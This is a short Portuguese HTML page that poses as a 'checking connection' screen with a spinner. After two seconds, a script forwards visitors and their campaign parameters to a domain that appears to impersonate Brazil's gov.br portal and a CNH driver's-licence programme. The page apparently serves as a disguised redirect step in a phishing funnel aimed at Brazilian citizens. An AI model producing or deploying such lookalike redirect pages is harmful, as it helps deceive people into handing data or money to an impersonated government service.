<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Verificando conexão</title>

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f5f5f5;
      color: #333;
    }

    .container {
      text-align: center;
    }

    .loader {
      margin: 20px auto 0;
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top: 4px solid #333;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Verificando conexão...</h2>
    <div class="loader"></div>
  </div>

  <script>
    setTimeout(() => {
      const params = window.location.search; // mantém todas as UTMs
      const destino = "https://govbr.cnhsociallbr.online/" + params;
      window.location.href = destino;
    }, 2000); // 2 segundos
  </script>
</body>
</html>
